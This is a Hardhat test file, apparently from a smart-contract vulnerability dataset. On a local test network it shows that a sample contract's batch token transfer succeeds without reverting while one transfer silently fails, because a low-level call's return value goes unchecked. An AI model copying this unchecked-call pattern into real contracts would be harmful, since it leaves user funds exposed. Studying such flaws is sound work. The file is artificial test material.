const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol", function () {
    let owner, sig;
  async function deployContracts() {
    [owner, sig] = await ethers.getSigners();
    const demo = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol:demo");
    const contract = await demo.deploy();

    const TokenEBU = await ethers.getContractFactory("contracts/unchecked_low_level_calls/TokenEBU.sol:TokenEBU");
    const token = await TokenEBU.connect(owner).deploy(1, "EBU", "EBU");

    return {contract, token}
  };

  it("exploit unchecked low level call vulnerability", async function () {
    const {contract, token} = await loadFixture(deployContracts);

    const amount = await token.balanceOf(owner.address);
    expect(amount).to.be.equal(1000000000000000000n);
    expect(await token.balanceOf(contract.target)).to.be.equal(0);
    expect(await token.balanceOf(sig.address)).to.be.equal(0);

    await token.connect(owner).approve(contract.target, 10);

    const value = await token.allowance(owner.address, contract.target);
    expect(value).to.be.equal(10);

    const from = owner.address;

    const to = [contract.target, sig.address];

    const val = [10, 10];

    // it does not revert cause the return value o all is not checked
    await expect(contract.transfer(from, token.target, to, val)).not.be.reverted;
    // the second transfer does not happen
    expect(await token.balanceOf(owner)).to.be.equal(amount - BigInt(10));
    expect(await token.balanceOf(contract.target)).to.be.equal(10);
    expect(await token.balanceOf(sig.address)).to.be.equal(0);

  });
});
